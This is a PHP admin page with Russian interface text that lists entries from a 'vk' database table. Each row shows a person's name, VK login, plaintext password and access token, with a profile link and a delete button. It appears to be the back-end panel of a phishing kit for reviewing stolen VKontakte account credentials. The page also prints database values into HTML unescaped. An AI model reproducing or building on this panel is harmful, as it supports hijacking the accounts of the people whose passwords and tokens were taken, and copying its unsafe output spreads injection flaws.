<?include('head.php');
?>

<div style='width:1000px; top:20px; background:#fff; padding:13px; border:1px solid #ccc; border-radius:3px; position:relative; margin:0 auto;'>

			<a href="vk.php" style="color:#4b0082">Данные VK</a> | <a href="settings.php">Настройки</a> | <a href="exit.php">Выйти</a>

</div>

<div style='width:1000px; background:#fff; padding:13px; border:1px solid #ccc; border-radius:3px; position:relative; margin:35px auto;'>

<span style="color:#4b0082;">Добро пожаловать | cегодня: <? echo date("d.m.y"); ?></span><br><br>

<table align="center" border="1" cellpadding="7" cellspacing="1" style="width: 100%; border:1px solid #ccc;">
	<tbody>
		<tr>
			<td style="text-align: center;">
			
			<table border="0" cellpadding="0" cellspacing="0" style="width: 100%; font-size:14px">
					<tbody>
						<tr style="border-bottom:1px solid #ccc;">
							
							<td rowspan="1" style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#008080;">И.Ф.</p></td>
							<td style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#008000;">Логин</p></td>
							<td style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#000080">Пароль</p></td>
					
							<td style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#000080">Token</p></td>
							<td style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#000080">ID</p></td>
							<td style="vertical-align: middle;"><p style="margin-top:5px; margin-bottom:5px; color:#000080">Удалить</p></td>
						</tr>
						
	<?
 
 $result = mysql_query("SELECT * FROM vk");
 
while ($row = mysql_fetch_array($result))
 {
	 
	echo "
	
							<tr style='border-bottom:1px solid #ccc;'>
							<td rowspan='1' style='text-align: center; vertical-align: middle; text-transform:lowercase '>$row[vopros1] $row[vopros2]</td>
							<td style='vertical-align: middle;'>$row[login]</td>
							<td style='text-align: center; vertical-align: middle;'>$row[pass]</td>
	
							<td style='text-align: center; vertical-align: middle; padding-top:5px;'><input value='$row[token]' style='width:200px; height:25px; padding-left:7px; padding-right:7px'/></td>
							<td style='text-align: center; vertical-align: middle; '><a href='https://vk.com/id$row[users]' target='_blank'>Ссылка VK</a></td>
							<td style='text-align: center; vertical-align: middle;padding-top:5px;'><span><form method='POST' action='del.php'><input type='hidden' name='delid' value='$row[id]' /><input type='submit' class='sendsubmit'  style='width:75px; height:25px; text-align:center; cursor:pointer' value='Удалить'></form></span></td>
							</td>
						    </tr>
	
	"; 
  
 }
 
mysql_free_result($result);
 ?>					
	
					</tbody>
				</table>
				<br>
				</td>
		</tr>	
	</tbody>
</table>

<?


include('footer-a.php');?>